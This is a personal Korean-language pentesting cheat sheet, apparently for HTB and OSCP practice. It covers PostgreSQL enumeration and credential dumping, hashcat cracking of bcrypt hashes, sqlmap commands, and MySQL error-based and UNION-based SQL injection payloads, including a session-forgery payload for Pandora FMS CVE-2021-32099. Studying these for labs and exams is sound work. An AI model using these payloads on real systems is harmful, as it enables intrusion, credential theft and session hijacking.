---
slug: "db"
title: "DB"
date: 2026-07-03
category: "치트시트"
tags: []
excerpt: "```shell # 기본 접속 psql -U <user> -h <host> -p <port>"
readingTime: 6
---

# PostgreSQL

### 접속

```shell
# 기본 접속
psql -U <user> -h <host> -p <port>

# 비밀번호 환경변수로 넘기기 (프롬프트 없이 자동 입력)
PGPASSWORD='<password>' psql -U <user> -h <host>

# DB 지정 접속
psql -U <user> -h <host> -d <dbname>
```

> ⚠️ psql이 잘 안되면 쉘 업그레이드 먼저
> 
> ```shell
> python3 -c 'import pty;pty.spawn("/bin/bash")'
> ```

### 기본 메타 명령어 (`\` 계열)

| 명령어             | 설명           |
| --------------- | ------------ |
| `\list` 또는 `\l` | DB 목록        |
| `\c <dbname>`   | DB 전환        |
| `\dt`           | 현재 DB 테이블 목록 |
| `\d <table>`    | 테이블 스키마 확인   |
| `\du`           | 유저(role) 목록  |
| `\q`            | 종료           |

> ⚠️ `WARNING: terminal is not fully functional` 뜨면서 페이저 걸릴 때 → `q` 누르면 빠져나옴

### SQL 쿼리

```sql
-- DB 버전 확인
SELECT version();

-- 테이블 전체 조회
SELECT * FROM users;

-- 특정 컬럼만 조회
SELECT name, password FROM users;

-- 조건 조회
SELECT * FROM users WHERE role = 'Admin';
```

> ⚠️ SQL은 반드시 `;` 로 끝내야 실행됨. `\` 메타 명령어는 `;` 불필요

### 자주 쓰는 흐름 (HTB 기준)

```postgresql
# 1. 접속
psql -U postgres -h 127.0.0.1

# 2. DB 목록 확인
\list

# 3. 타겟 DB로 전환
\c {DB}

# 4. 테이블 목록 확인
\dt

# 5. 스키마 확인
\d {schema}

# 6. 크레덴셜 덤프
SELECT * FROM users;
```

---
### 해시 크랙 연계

users 테이블에서 해시 나오면 → [[HASH]] 참고
```shell
# bcrypt ($2a$) → hashcat -m 3200
hashcat -m 3200 -a 0 '<hash>' /usr/share/wordlists/rockyou.txt

# 주의: 해시에 $ 있으면 반드시 작은따옴표 사용
echo '<hash>' > hash.txt  # 작은따옴표
```

---
# sqlmap
이건 귀찮을 때만 쓰기 -> 왜냐면 oscp는 sqlmap이 금지임 반드시 코딩하기


**각 코드 미리 짜놓고 써도 됨** 
- **UNION-based** — 제일 빠름, 한 번에 결과 바로 나옴
- **Error-based** — 빠름, 에러 메시지에 데이터 실려서 나옴
- **Boolean-based blind** — 느림, 참/거짓으로 한 비트씩 추출
- **Time-based blind** — 제일 느림, SLEEP() 응답시간으로 판별

자동화 툴

```shell
sqlmap -u "{url}" --cookie "{cookie_name}={value}" --dbms={ex)mysql} --level=3 --risk=3 --batch --data '{"id":"*"}' --dbs
# DB 나오면 -D <dbname> --tables
# 테이블 나오면 -D <dbname> -T <table> --dump
```
-> --data는 burp에서 미리 확인한 형식에  `*`는 여기에 데이터 넣어라 라는 뜻임
-> -u는 이왕이면 직접 붙을 수 있는 그런 form 형식에다가 넣는게 좋을 듯 함

```shell
# get이면
sqlmap -u "http://target.com/page?id=1" --dbs

# POST면
sqlmap -u "http://target.com/login" --data "username=*&password=test" --dbs
```

## 참고
https://m.blog.naver.com/snova84/223732642788?recommendTrackingCode=2

---
# Mysql

#### Error-based SQLi (extractvalue)
```
# DB 이름
' and extractvalue(1, concat(0x3a, (select database()))) and 1=1 -- 

# 테이블 이름
' and extractvalue(1, concat(0x3a, (select table_name from information_schema.tables where table_schema='DB명' limit 0,1))) and 1=1 -- 

# 컬럼 이름
' and extractvalue(1, concat(0x3a, (select column_name from information_schema.columns where table_name='테이블명' limit 0,1))) and 1=1 -- 

# 값 추출
' and extractvalue(1, concat(0x3a, (select 컬럼명 from 테이블명 limit 0,1))) and 1=1 -- 

# 안되면 URL 인코딩 시도
# limit으로 하나씩 올려가며 enumerate
```

#### UNION-based SQLi
```
# 컬럼 수 파악
' UNION SELECT null -- - # 에러 
' UNION SELECT null,null -- - # 에러
 ' UNION SELECT null,null,null -- - # 성공 → 3컬럼

# 데이터 주입 (위치 기반)
' UNION SELECT null,null,페이로드 -- -

# 세션 위조 (Pandora FMS CVE-2021-32099 패턴)
a' UNION SELECT 'a', 1, 'id_usuario|s:5:"admin";' -- -
# → PHP session_decode()가 역직렬화 → $_SESSION['id_usuario']="admin"
```

**참고 :** [[Blind sqli script]]
